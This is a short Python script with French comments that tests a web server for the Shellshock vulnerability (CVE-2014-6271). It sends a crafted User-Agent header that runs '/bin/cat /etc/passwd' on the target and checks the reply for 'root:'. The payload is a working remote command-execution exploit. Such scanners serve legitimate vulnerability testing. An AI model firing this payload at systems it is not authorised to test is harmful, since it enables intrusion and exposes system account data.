import socket
import re

def check_shellshock(host, port=80, path='/', timeout=3):
    """
    Teste la vulnérabilité Shellshock (CVE-2014-6271) sur un CGI Bash.
    Retourne True si vulnérable, False sinon, None si erreur.
    """
    payload = "() { :;}; echo; echo; /bin/cat /etc/passwd"
    req = f"GET {path} HTTP/1.0\r\nHost: {host}\r\nUser-Agent: {payload}\r\n\r\n"
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(req.encode())
            resp = b''
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 4096:
                    break
        if b'root:' in resp:
            return True
        return False
    except Exception:
        return None
